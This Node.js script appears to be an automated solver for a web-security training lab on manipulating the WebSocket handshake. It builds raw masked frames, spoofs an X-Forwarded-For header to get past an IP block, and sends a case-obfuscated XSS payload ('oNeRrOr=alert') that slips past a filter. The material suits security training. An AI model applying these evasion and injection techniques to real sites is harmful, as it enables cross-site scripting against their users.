const crypto = require('crypto');
const tls = require('tls');

const { runLab } = require('./_common.cjs');

const TITLE = 'Manipulating the WebSocket handshake to exploit vulnerabilities';
const PATH = '/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities';

function buildMaskedTextFrame(message) {
  const payload = Buffer.from(message, 'utf8');
  const mask = crypto.randomBytes(4);
  let header;

  if (payload.length < 126) {
    header = Buffer.from([0x81, 0x80 | payload.length]);
  } else if (payload.length < 65536) {
    header = Buffer.alloc(4);
    header[0] = 0x81;
    header[1] = 0x80 | 126;
    header.writeUInt16BE(payload.length, 2);
  } else {
    throw new Error('Payload too large');
  }

  const masked = Buffer.alloc(payload.length);
  for (let index = 0; index < payload.length; index += 1) {
    masked[index] = payload[index] ^ mask[index % 4];
  }

  return Buffer.concat([header, mask, masked]);
}

function buildCloseFrame() {
  return Buffer.from([0x88, 0x80, 0, 0, 0, 0]);
}

async function sendWebSocketMessages({ host, path, origin, cookie, extraHeaders = {}, messages }) {
  const key = crypto.randomBytes(16).toString('base64');
  const socket = tls.connect({ host, port: 443, servername: host, rejectUnauthorized: true });

  await new Promise((resolve, reject) => {
    socket.once('secureConnect', resolve);
    socket.once('error', reject);
  });

  const headers = {
    Host: host,
    Upgrade: 'websocket',
    Connection: 'Upgrade',
    'Sec-WebSocket-Key': key,
    'Sec-WebSocket-Version': '13',
    Origin: origin,
    Cookie: cookie,
    ...extraHeaders,
  };

  const request = [
    `GET ${path} HTTP/1.1`,
    ...Object.entries(headers).map(([name, value]) => `${name}: ${value}`),
    '',
    '',
  ].join('\r\n');

  socket.write(request);

  await new Promise((resolve, reject) => {
    let buffer = '';
    const onData = (chunk) => {
      buffer += chunk.toString('latin1');
      if (buffer.includes('\r\n\r\n')) {
        socket.off('data', onData);
        if (!/^HTTP\/1\.1 101 /i.test(buffer)) {
          reject(new Error(`Unexpected handshake response: ${buffer.split('\r\n')[0]}`));
          return;
        }
        resolve();
      }
    };
    socket.on('data', onData);
    socket.once('error', reject);
    socket.once('close', () => reject(new Error('Socket closed before handshake completed')));
  });

  for (const message of messages) {
    socket.write(buildMaskedTextFrame(message));
    await new Promise((resolve) => setTimeout(resolve, 250));
  }
  await new Promise((resolve) => setTimeout(resolve, 1500));
  socket.write(buildCloseFrame());
  socket.end();
  await new Promise((resolve) => socket.once('close', resolve));
}

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ context, labUrl }) => {
    const { hostname } = new URL(labUrl);
    const cookies = await context.cookies(labUrl);
    const cookieHeader = cookies.map(({ name, value }) => `${name}=${value}`).join('; ');
    await sendWebSocketMessages({
      host: hostname,
      path: '/chat',
      origin: labUrl,
      cookie: cookieHeader,
      extraHeaders: { 'X-Forwarded-For': '1.1.1.1' },
      messages: [
        'READY',
        JSON.stringify({ message: '<img src=1 oNeRrOr=alert`1`>' }),
      ],
    });

    await new Promise((resolve) => setTimeout(resolve, 4000));
  },
});
